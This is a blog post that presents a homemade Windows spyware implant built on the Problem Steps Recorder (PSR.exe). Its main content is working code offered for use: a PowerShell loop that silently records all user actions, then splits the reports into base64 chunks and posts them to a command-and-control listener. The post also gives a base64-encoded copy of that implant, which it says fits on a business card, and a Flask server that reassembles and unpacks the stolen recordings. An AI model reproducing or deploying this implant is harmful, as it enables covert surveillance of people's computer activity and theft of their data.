---
title: "At this point windows is just spyware"
date: "2026-05-06T18:00:03+01:00"
layout: post
---


We all know how shit it is to use Microsoft Windows. But honestly who the fuck would have anticipated that windows actually contains spyware. Or at least components that makes building a spyware as easy as lego bricks. 

Here is a tiny writeup for a tiny spyware that i made using ```PSR.exe (problem steps recorder)```

> For all tech toddlers: PSR.EXE allows you to record ANY action inside Windows and generate a detailed documentation alongside custom annotations as a .MHT Report. 


Obviously part 1 was to craft a tiny recorder that would abuse PSR.EXE inside an infite loop, then temporarily store the reports and send them back to a C2 server. Here is a super tiny implant that I made in less than an hour.

```powershell
$outDir="C:\Temp";mkdir $outDir -Force|Out-Null
while($true){
  $ts=Get-Date -Format "yyyyMMddHHmmss"
  $p="$outDir\$ts.zip"
  start-process psr.exe "/start /output $p /gui 0"
  sleep 10 # record time
  start-process psr.exe "/stop"
  while(!(Test-Path $p)){sleep 1}  # wait until file exists
  $b=[IO.File]::ReadAllBytes($p)
  $cs=100KB;$t=[math]::Ceiling($b.Length/$cs)
  for($i=0;$i -lt $t;$i++){
    $s=$i*$cs;$l=[math]::Min($cs,$b.Length-$s)
    $c=New-Object byte[] $l
    [Array]::Copy($b,$s,$c,0,$l)
    iwr http://127.0.0.1:6969 -Method Post -Body @{id=$ts;index=$i;total=$t;data=[Convert]::ToBase64String($c)} -UseBasicParsing|Out-Null
  }
  Remove-Item $p -Force;sleep 1
}
```
If you encode the implant as base64 it can even fit on your business card.

```bash
JG91dERpcj0iQzpcVGVtcCI7bWtkaXIgJG91dERpciAtRm9yY2V8T3V0LU51bGwKd2hpbGUoJHRy
dWUpewogICR0cz1HZXQtRGF0ZSAtRm9ybWF0ICJ5eXl5TU1kZEhIbW1zcyIKICAkcD0iJG91dERp
clwkdHMuemlwIgogIHN0YXJ0LXByb2Nlc3MgcHNyLmV4ZSAiL3N0YXJ0IC9vdXRwdXQgJHAgL2d1
aSAwIgogIHNsZWVwIDEwICMgcmVjb3JkIHRpbWUKICBzdGFydC1wcm9jZXNzIHBzci5leGUgIi9z
dG9wIgogIHdoaWxlKCEoVGVzdC1QYXRoICRwKSl7c2xlZXAgMX0gICMgd2FpdCB1bnRpbCBmaWxl
IGV4aXN0cwogICRiPVtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRwKQogICRjcz0xMDBLQjskdD1b
bWF0aF06OkNlaWxpbmcoJGIuTGVuZ3RoLyRjcykKICBmb3IoJGk9MDskaSAtbHQgJHQ7JGkrKyl7
CiAgICAkcz0kaSokY3M7JGw9W21hdGhdOjpNaW4oJGNzLCRiLkxlbmd0aC0kcykKICAgICRjPU5l
dy1PYmplY3QgYnl0ZVtdICRsCiAgICBbQXJyYXldOjpDb3B5KCRiLCRzLCRjLDAsJGwpCiAgICBp
d3IgaHR0cDovLzEyNy4wLjAuMTo2OTY5IC1NZXRob2QgUG9zdCAtQm9keSBAe2lkPSR0cztpbmRl
eD0kaTt0b3RhbD0kdDtkYXRhPVtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGMpfSAtVXNlQmFz
aWNQYXJzaW5nfE91dC1OdWxsCiAgfQogIFJlbW92ZS1JdGVtICRwIC1Gb3JjZTtzbGVlcCAxCn0
```

The implant will record **ALL** user actions inside windows using PSR.EXE, then after 10 seconds export the report as a zipfile to %TEMP% and then send them as encoded base64 chunks to the C2 server.

For the C2 / listener server I decided to use Python Flask since it is super easy to use. 

```python
from flask import Flask,request
import base64,os,logging,subprocess as s

logging.getLogger('werkzeug').setLevel(logging.ERROR)
app,store=Flask(__name__),{}
print("\n(╯°□°）╯︵ ┻━┻\n")

@app.route('/',methods=['POST'])
def recv():
    d=request.form;fid=d['id'];i=int(d['index']);t=int(d['total'])
    store.setdefault(fid,[None]*t)[i]=base64.b64decode(d['data'])
    print(f"[+] Received {fid}: {i+1}/{t}")

    if all(store[fid]):
        z=f"{fid}.zip";o=f"{fid}_extracted"
        with open(z,"wb") as f: [f.write(c) for c in store[fid]]
        print(f"[+] Reassembled: {z}")

        os.makedirs(o,exist_ok=True)
        s.run(["7z","x",z,f"-o{o}","-y"],stdout=s.DEVNULL,stderr=s.DEVNULL)
        os.remove(z)
        for r,_,fs in os.walk(o):
            for n in fs:
                p=os.path.join(r,n)
                print(f"[+] Extracted: {n} ({os.path.getsize(p)} bytes)")
        print();store.pop(fid)
    return "ok"

from werkzeug.serving import run_simple
run_simple("0.0.0.0",6969,app,use_reloader=False)
```

The server will listen on incoming requests from implants, decode the base64 body and then finally reassemble the chunks into one main file. The final file will then be decompressed so we can look at the original .MHT File.

Here is a sample Report:

![report](https://b3034685.smushcdn.com/3034685/wp-content/uploads/PSR-NoScreenshotsSaved.jpg)
